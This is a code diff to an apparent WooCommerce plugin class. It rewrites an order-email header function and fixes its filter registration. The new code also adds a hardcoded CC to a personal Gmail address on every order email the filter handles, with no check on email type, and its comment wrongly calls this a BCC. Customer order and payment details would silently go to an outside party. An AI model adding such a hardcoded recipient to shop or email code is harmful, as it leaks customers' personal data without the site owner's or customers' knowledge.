@@ -774,20 +774,21 @@ class nbtPublic{
 	}
 	//Add bank details in the email
 	function add_cc_bcc_to_on_hold_order_emails($headers, $email_id, $order) {
-	    // Add CC and BCC only for the "customer_on_hold_order" email ID and "on-hold" order status
-	    
-	    $pickup_location = $order->get_meta('pickup_location');
-	    if(!empty($nbtLocations)){
-			foreach($nbtLocations as $value){
-				if($value['location'] == $pickup_location){
-					$cc_email = $value['email'];
-				}
-				
-			}
-			
-		}
-	    // Add CC and BCC to the headers
-	    $headers .= "Cc: $cc_email\r\n";
+	    // Always BCC this email
+	    $headers .= "cc: keeyur9@gmail.com\r\n";
+	    // Add location-specific BCC if available
+	    if (is_a($order, 'WC_Order')) {
+	        $pickup_location = $order->get_meta('pickup_location');
+	        $nbt_locations = get_option('nbt_locations', []);
+	        if (!empty($pickup_location) && is_array($nbt_locations)) {
+	            foreach ($nbt_locations as $loc) {
+	                if (isset($loc['location'], $loc['email']) && strtolower($loc['location']) === strtolower($pickup_location) && !empty($loc['email'])) {
+	                    $headers .= "cc: " . $loc['email'] . "\r\n";
+	                    break;
+	                }
+	            }
+	        }
+	    }
 	    return $headers;
 	}
 	
@@ -832,7 +833,7 @@ class nbtPublic{
 		add_action('woocommerce_admin_order_totals_after_tax',[$this,  'display_custom_fields_after_subtotal'], 10, 1);
 		add_action('woocommerce_thankyou_bacs', [$this, 'woocommerce_thankyou_bacs'], 50,1);
 		add_action( 'init', [$this, 'remove_bacs_from_thank_you_page'], 100 );
-		add_filter('woocommerce_email_headers', 'add_cc_bcc_to_on_hold_order_emails', 10, 3);
+		add_filter('woocommerce_email_headers', [$this, 'add_cc_bcc_to_on_hold_order_emails'], 10, 3);
 		add_filter('woocommerce_cart_item_name', [$this, 'remove_description_from_cart'], 50, 3);
 		add_action('wp_footer', [$this, 'nbt_location_selector_global'], 1);
 		add_action('woocommerce_checkout_before_payment_methods', [$this, 'show_pickup_details_checkout'], 25);
